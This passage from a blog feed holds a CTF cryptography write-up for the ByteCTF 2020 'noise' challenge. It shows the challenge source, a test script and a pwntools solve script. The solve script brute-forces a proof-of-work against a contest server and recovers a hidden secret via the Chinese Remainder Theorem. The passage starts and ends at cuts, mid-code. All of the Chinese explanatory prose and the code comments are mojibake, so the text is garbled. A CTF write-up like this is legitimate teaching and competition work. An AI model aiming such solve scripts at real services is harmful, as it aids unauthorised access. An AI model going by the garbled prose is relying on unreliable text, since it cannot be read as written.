class="line">sh.sendline(newsignature)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ByteCTF&amp;X-NUCA</title>
      <link href="/2020/11/04/2020ByteCTF&amp;X-NUCA%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/11/04/2020ByteCTF&amp;X-NUCA%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/221400" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><p>æœ€è¿‘æ‰“äº†ByteCTFå’ŒX-NUCAä¸¤åœºæ¯”èµ›ï¼Œé¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œï¼ˆWebæ‰‹ä»¬éƒ½å“­äº†ï¼‰ä¸¤åœºæ¯”èµ›è‡ªå·±ä¹Ÿåˆ†åˆ«åªåšå‡ºä¸¤é“å¯†ç å­¦æ–¹å‘çš„é¢˜ç›®ï¼Œèœç‹—è½æ³ªã€‚</p><p>è¿™é‡Œè®°å½•ä¸‹è‡ªå·±è§£é¢˜çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¯èƒ½åºŸè¯æ¯”è¾ƒå¤šï¼Œå½“ç„¶ä¹Ÿæ˜¯å¸Œæœ›èƒ½å¤Ÿè¡¨è¾¾çš„æ¸…æ¥šã€‚å¦‚æœåªæ˜¯æƒ³çœ‹æœ€ç»ˆè§£é¢˜æ–¹æ³•çš„è¯»è€…å¯ä»¥ç›´æ¥è·³è§£é¢˜æµç¨‹ã€‚</p><h2 id="ByteCTF"><a href="#ByteCTF" class="headerlink" title="ByteCTF"></a>ByteCTF</h2><h3 id="noise"><a href="#noise" class="headerlink" title="noise"></a>noise</h3><p>éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šä¸­å›½å‰©ä½™å®šç†</p><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span><span class="params">(bit)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int.from_bytes(urandom(bit &gt;&gt; <span class="number">3</span>), <span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span> -&gt; bool:</span></span><br><span class="line">    alphabet = string.ascii_letters + string.digits</span><br><span class="line">    nonce = <span class="string">""</span>.join(choices(alphabet, k=<span class="number">8</span>))</span><br><span class="line">    print(<span class="string">f'SHA256("<span class="subst">&#123;nonce&#125;</span>" + ?) starts with "00000"'</span>)</span><br><span class="line">    suffix = input().strip()</span><br><span class="line">    message = (nonce + suffix).encode(<span class="string">"Latin-1"</span>)</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest().hex().startswith(<span class="string">"00000"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    signal.alarm(<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"Listen...The secret iz...M2@9c0f*#aF()I!($Ud3;J..."</span></span><br><span class="line">          <span class="string">"Hello?...really noisy here again...God bless you get it..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            op = input().strip()</span><br><span class="line">            num = input().strip()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str.isnumeric(num):</span><br><span class="line">            print(<span class="string">"INVALID NUMBER"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        num = int(num)</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'god'</span>:</span><br><span class="line">            print(num * getrandbits(<span class="number">992</span>) % secret)</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'bless'</span>:</span><br><span class="line">            <span class="keyword">if</span> num == secret:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">                    <span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    FLAG = <span class="string">"but something is error. Please contact the admin."</span></span><br><span class="line"></span><br><span class="line">                print(<span class="string">"CONGRATULATIONS %s"</span>%FLAG)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            print(<span class="string">"WRONG SECRET"</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>è¿˜å¥½ï¼Œç¬¬ä¸€é¢˜ä»£ç é‡ä¸å¤§ï¼Œä¸é”™ä¸é”™ã€‚çœ‹ä¸€çœ‹ï¼Œè¿™ä¸€é¢˜åŠŸèƒ½å¾ˆç®€å•ï¼Œä½ è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œä»–è¿”å›ç»™ä½ ä¸€ä¸ªï¼Œä½ çš„æ•°å­— ä¹˜ä¸Šä¸€ä¸ª992bitçš„ éšæœºæ•°å­—  æ¨¡ä¸Šä¸€ä¸ª1024bitçš„secret çš„ç»“æœã€‚å½“ç„¶ï¼Œæ¯æ¬¡è¿æ¥ä¸Šåç”Ÿæˆçš„secretæ˜¯éšæœºçš„ï¼Œä½†æ˜¯è¿ä¸Šä¸€æ¬¡ï¼Œå¯ä»¥äº¤äº’64æ¬¡ï¼Œæ­¤æ—¶secretæ˜¯ä¿æŒä¸å˜çš„ã€‚ç®—ä¸Šä½ éœ€è¦ä¸€æ¬¡äº¤äº’æ¥è·å–flagï¼Œé‚£ä¹ˆå°±æ˜¯éœ€è¦åœ¨63æ¬¡ä¹‹å†…â€œçŒœâ€åˆ°è¿™ä¸ªéšæœºç”Ÿæˆçš„secretã€‚</p><p>å¥½çš„ï¼Œä¸Šå¼å­ï¼Œæˆ‘ä»¬çŸ¥é“ä¸­å›½å‰©ä½™å®šç†æ˜¯è¿™æ ·å­çš„</p><p>$m \equiv c_1 \pmod {n_1}$                                    $m = c_1+k_1n_1$</p><p>$m \equiv c_2 \pmod {n_2}$            ç­‰ä»·äº            $m = c_2+k_2n_2$</p><p>$m \equiv c_3 \pmod {n_3}$                                    $m = c_3+k_3n_3$                                                        </p><p>æ³¨æ„è¿™é‡Œçš„æ¨¡æ˜¯nï¼Œä»–ä»¬å½¼æ­¤äº’ç´ ï¼Œç„¶ååˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†å°±å¯ä»¥æ¢å¤mï¼ˆå¦‚æœmçš„bitä½æ•°å°äºæ‰€æœ‰nçš„bitä½æ•°ä¹‹å’Œçš„è¯ï¼‰</p><p>æ­¤æ—¶ï¼Œå¦‚æœkéƒ½ç­‰äº1ï¼Œé‚£ä¹ˆï¼Œ</p><p>$m = c_1+n_1$                                $m = n_1+c_1$</p><p>$m = c_2+n_2$            ç­‰ä»·äº        $m = n_2+c_2$        </p><p>$m = c_3+n_3$                                $m = n_3+c_3$            </p><p>æ­¤æ—¶nå’Œcå°±å¥½åƒç­‰ä»·äº†ï¼Œå¹¶ä¸èƒ½çŸ¥é“æ¨¡æ•°åˆ°åº•æ˜¯å“ªä¸ªï¼Œæ¢ä¸€ä¸ªè¯´æ³•å°±æ˜¯ï¼Œnå’Œcéƒ½å¯ä»¥çœ‹ä½œæ˜¯æ¨¡æ•°</p><p>æˆ‘ä»¬å†å›åˆ°è¿™é“é¢˜æœ¬èº«ï¼Œè®¾æˆ‘ä»¬å‘é€çš„å€¼æ˜¯$n_1,n_2,n_3$ï¼Œsecretä¸ºsï¼Œè¿”å›çš„å€¼æ˜¯$c_1,c_2,c_3$ï¼Œ</p><p>é‚£ä¹ˆå°±ä¼šæœ‰è¿™ä¹ˆäº›å¼å­</p><p>$n_1 * randnum1  \equiv c_1 \pmod s = c_1+k_1s$</p><p>$n_2 * randnum2  \equiv c_2 \pmod s= c_2+k_2s$</p><p>$n_3 * randnum3  \equiv c_3 \pmod s= c_3+k_3s$</p><p>æ­¤æ—¶å¦‚æœkå€¼éƒ½ä¸º1ï¼Œå†æŒªä¸ªä½ç½®ï¼Œé‚£ä¹ˆå°±æœ‰</p><p>$s = n_1 * randnum1- c_1$</p><p>$s = n_2* randnum2 - c_2$</p><p>$s = n_3 * randnum3- c_3$</p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å¼å­ä¸¤è¾¹å»ä¸€ä¸ªæ¨¡$n_1,n_2,n_3$</p><p>$s \equiv- c_1 \pmod{n_1}$</p><p>$s \equiv- c_2 \pmod{n_2}$</p><p>$s \equiv- c_3 \pmod{n_3}$</p><p>è¿™ä¸å°±æ˜¯ä¸­å›½å‰©ä½™å®šç†å½¢å¼ä¹ˆï¼Ÿæ‰€ä»¥å½“ç­‰äº1ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ¥æ¢å¤è¿™ä¸ªsecret</p><p>éœ€è¦æ»¡è¶³çš„æ¡ä»¶å°±æ˜¯ï¼Œ$n*randnum = c+s$ï¼Œè¿˜æœ‰å°±æ˜¯nçš„bitä½æ•°ä¹‹å’Œè¦å¤§äºsçš„bitä½æ•°å³1024</p><p>å½“ç„¶ï¼Œè¿™å°±éœ€è¦è¿æ°”äº†ï¼Œå› ä¸ºä»–è¿œç¨‹ç”Ÿæˆçš„ä¹˜æ•°æ˜¯éšæœºçš„992bitæ•°å­—ï¼ˆå½“ç„¶æ˜¯æœ‰å¯èƒ½ä¼šå°äº992bitçš„ï¼‰ï¼Œè€Œsæ˜¯1024bitçš„æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‘é€çš„nå¤§æ¦‚å°±æ˜¯32bitçš„ç´ æ•°ï¼Œ32*32=1024ï¼Œæ‰€ä»¥åœ¨63æ¬¡äº¤äº’å†…æˆ‘ä»¬éœ€è¦æœåŠ¡å™¨ç”Ÿæˆ32ä¸ªéšæœºæ•°æ˜¯â€œå¥½â€çš„ï¼Œæ‰€è°“â€å¥½â€â€å°±æ˜¯è¦è®©è¿™ä¸ªkæ­£å¥½ç­‰äº1ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆæœ¬åœ°ç®€å•çš„æµ‹ä¸€æµ‹ï¼Œå¯ä»¥é€‰æ‹©æ¯”è¾ƒå°çš„æ•°ç»™ä»–ä¹˜ï¼Œè¿™æ ·å­çš„kå¤§æ¦‚ç‡ä¼šæ˜¯0æˆ–è€…1ï¼Œè€Œ0æ¯”è¾ƒå¥½åˆ¤æ–­ï¼Œç›´æ¥åˆ¤æ–­è¿”å›çš„å€¼æ˜¯å¦è¢«æˆ‘ä»¬å‘é€è¿‡å»çš„æ•°æ•´é™¤å°±å¯ä»¥äº†ã€‚è€Œæ˜¯å¦æ­£å¥½ç­‰äº1æˆ‘ä»¬æ˜¯æ— æ³•åˆ¤æ–­çš„ï¼Œä½†å‡¡ä¸€ç»„æ•°æ®æ’å…¥äº†ä¸€ä¸ªè®©kä¸ç­‰äº1æˆ–è€…0çš„æ•°ï¼Œé‚£ä¹ˆæ•´ç»„æ•°æ®å°±ä½œåºŸäº†ã€‚æ‰€ä»¥æˆ‘ä»¬å‘é€å°½é‡å°çš„æ•°nï¼Œè®©kå€¼å¤§æ¦‚ç‡åªè½åœ¨0æˆ–è€…1ä¸Šã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from random import *</span><br><span class="line">primes = [<span class="number">4294966427</span>, <span class="number">4294966441</span>, <span class="number">4294966447</span>, <span class="number">4294966477</span>, <span class="number">4294966553</span>, <span class="number">4294966583</span>, <span class="number">4294966591</span>, <span class="number">4294966619</span>, <span class="number">4294966639</span>, <span class="number">4294966651</span>, <span class="number">4294966657</span>, <span class="number">4294966661</span>, <span class="number">4294966667</span>, <span class="number">4294966769</span>, <span class="number">4294966813</span>, <span class="number">4294966829</span>, <span class="number">4294966877</span>, <span class="number">4294966909</span>, <span class="number">4294966927</span>, <span class="number">4294966943</span>, <span class="number">4294966981</span>, <span class="number">4294966997</span>, <span class="number">4294967029</span>, <span class="number">4294967087</span>, <span class="number">4294967111</span>, <span class="number">4294967143</span>, <span class="number">4294967161</span>, <span class="number">4294967189</span>, <span class="number">4294967197</span>, <span class="number">4294967231</span>, <span class="number">4294967279</span>, <span class="number">4294967291</span>]</span><br><span class="line"></span><br><span class="line">for _ in range(<span class="number">20</span>):</span><br><span class="line">    secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    for num in primes:</span><br><span class="line">            print(num * getrandbits(<span class="number">992</span>) // secret),</span><br><span class="line">    print</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å›ºå®šäº†éšæœºæ•°ï¼Œç„¶åç»è¿‡20æ¬¡çš„æµ‹è¯•ï¼Œä¸‹é¢æ˜¯æµ‹è¯•ç»“æœ</p><p><img src="https://i.loli.net/2020/12/17/l4VdMyeQmps7JPt.png" alt="image-20201102145925061"></p><p>å¯ä»¥å‘ç°ï¼Œç”Ÿæˆçš„éšæœºæ•°ä¼¼ä¹ä¹Ÿå…·æœ‰ä¸€å®šç¨‹åº¦çš„å±€éƒ¨æ€§ï¼Œå½“kå‡ºç°7ï¼Œ8è¿™æ ·æ¯”è¾ƒå¤§çš„æ•°çš„æ—¶å€™ï¼Œå‡ ä¹æ•´ç»„çš„kéƒ½æ¯”è¾ƒå¤§ï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç”±äºæˆ‘ä»¬è¾“å…¥çš„ç´ æ•°æ¯”è¾ƒå°ï¼Œè¿˜æ˜¯åªæœ‰0å’Œ1çš„æƒ…å†µåå¤šï¼Œä½†ä¸€èˆ¬ä¹Ÿæ˜¯0åå¤šï¼Œæ‰€ä»¥ï¼Œï¼Œçœ‹è„¸äº†ï¼Œåªè¦æœ‰ä¸€åŠä»¥ä¸Šçš„1ï¼Œæˆ‘ä»¬å°±æˆåŠŸäº†ã€‚</p><h4 id="è§£é¢˜æµç¨‹ï¼š"><a href="#è§£é¢˜æµç¨‹ï¼š" class="headerlink" title="è§£é¢˜æµç¨‹ï¼š"></a>è§£é¢˜æµç¨‹ï¼š</h4><ol><li>ç¡®å®š63ä¸ªæ¯”è¾ƒå°çš„ç´ æ•°</li><li>æŠŠè¿™äº›å€¼å‘é€è¿‡å»</li><li>æ”¶åˆ°çš„å€¼è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯å¦è¢«è‡ªå·±å‘è¿‡å»çš„æ•°æ•´é™¤ï¼Œæ˜¯å°±æ‰”æ‰ï¼Œå¦åˆ™å°±å­˜èµ·æ¥</li><li>å­˜èµ·æ¥çš„æ•°è¶…è¿‡32ä¸ªå°±å¯ä»¥è¿›è¡ŒCRTå°è¯•æ¢å¤secret</li><li>å‘é€secretè¿‡å»éªŒè¯ï¼Œè¦æ˜¯æ²¡æ‹¿åˆ°flagå°±å›åˆ°ç¬¬2æ­¥ï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ï¼ŒåŠ æ²¹å§ï¼Œçœ‹ä½ çš„è„¸äº†ï¼</li></ol><p>expï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from hashlib import <span class="built_in">sha256</span></span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCRT(mi, ai):</span><br><span class="line">    assert (isinstance(mi, <span class="keyword">list</span>) <span class="built_in">and</span> isinstance(ai, <span class="keyword">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">m</span>, <span class="keyword">a</span>) in zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = <span class="keyword">int</span>(GCD(curm, <span class="keyword">m</span>))</span><br><span class="line">        <span class="keyword">c</span> = <span class="keyword">a</span> - cura</span><br><span class="line">        assert (<span class="keyword">c</span> % d == <span class="number">0</span>)</span><br><span class="line">        K = <span class="keyword">c</span> // d * inverse(curm // d, <span class="keyword">m</span> // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * <span class="keyword">m</span> // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> cura % curm, curm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def proof_of_work(<span class="keyword">sh</span>):</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"SHA256(\""</span>)</span><br><span class="line">    nonce = <span class="keyword">sh</span>.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'with \"00000\"'</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">a</span> in tqdm(<span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f)):</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">b</span> in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">c</span> in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">                <span class="keyword">for</span> d in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">                    rest = chr(<span class="keyword">a</span>) + chr(<span class="keyword">b</span>) + chr(<span class="keyword">c</span>) + chr(d)</span><br><span class="line">                    <span class="keyword">m</span> = (nonce.decode(<span class="string">'latin1'</span>) + rest).encode(<span class="string">"Latin-1"</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">sha256</span>(<span class="keyword">m</span>).digest().hex().startswith(<span class="string">"00000"</span>):</span><br><span class="line">                        <span class="keyword">sh</span>.sendline(rest)</span><br><span class="line">                        <span class="keyword">sh</span>.recvuntil(<span class="string">'again...God bless you get it...'</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def io(<span class="keyword">sh</span>, num):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'god'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(num))</span><br><span class="line">    tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &gt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">int</span>(tmp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">primes = [<span class="number">4294966427</span>, <span class="number">4294966441</span>, <span class="number">4294966447</span>, <span class="number">4294966477</span>, <span class="number">4294966553</span>, <span class="number">4294966583</span>, <span class="number">4294966591</span>, <span class="number">4294966619</span>, <span class="number">4294966639</span>, <span class="number">4294966651</span>, <span class="number">4294966657</span>, <span class="number">4294966661</span>, <span class="number">4294966667</span>, <span class="number">4294966769</span>, <span class="number">4294966813</span>, <span class="number">4294966829</span>, <span class="number">4294966877</span>, <span class="number">4294966909</span>, <span class="number">4294966927</span>, <span class="number">4294966943</span>, <span class="number">4294966981</span>, <span class="number">4294966997</span>, <span class="number">4294967029</span>, <span class="number">4294967087</span>, <span class="number">4294967111</span>, <span class="number">4294967143</span>, <span class="number">4294967161</span>, <span class="number">4294967189</span>, <span class="number">4294967197</span>, <span class="number">4294967231</span>, <span class="number">4294967279</span>, <span class="number">4294967291</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">sh</span> = remote(<span class="string">"182.92.153.117"</span>, <span class="number">30101</span>)</span><br><span class="line">    proof_of_work(<span class="keyword">sh</span>)</span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">c</span> = []</span><br><span class="line">    <span class="built_in">index</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">        tmp = io(<span class="keyword">sh</span>, primes[<span class="built_in">index</span>])</span><br><span class="line">        <span class="keyword">if</span> tmp%primes[<span class="built_in">index</span>] !=<span class="number">0</span>://è¿™ä¸ªåˆ¤æ–­æ˜¯å‰”é™¤<span class="keyword">k</span>ç­‰äº<span class="number">0</span>çš„æƒ…å†µ</span><br><span class="line">            <span class="keyword">c</span>.<span class="keyword">append</span>(-<span class="number">1</span> * tmp)</span><br><span class="line">            <span class="built_in">index</span> += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">index</span> &gt;= <span class="number">32</span>://å¦‚æœè¶…è¿‡<span class="number">32</span>ä¸ªæ•°çš„<span class="keyword">k</span>ä¸ç­‰äº<span class="number">0</span>ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿æ¥ç”¨äº†ï¼Œä½†ä¹Ÿä¸ç¡®å®šæ˜¯å¦è¿™<span class="number">32</span>ä¸ªæ•°éƒ½ä¸º<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">index</span> &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    secret = GCRT(primes, <span class="keyword">c</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'bless'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(secret))</span><br><span class="line">    tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &lt; <span class="number">5</span>:</span><br><span class="line">        tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">b</span><span class="string">'WRONG'</span> in tmp:</span><br><span class="line">        <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span>(tmp)</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><p>æ¯”èµ›çš„æ—¶å€™å¤§æ¦‚è·‘äº†2minå­ï¼Œè¿æ°”è¿˜æ˜¯å¯ä»¥çš„ã€‚</p><h3 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h3><p>éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šæ¤­åœ†æ›²çº¿ç›¸å…³æ€§è´¨</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 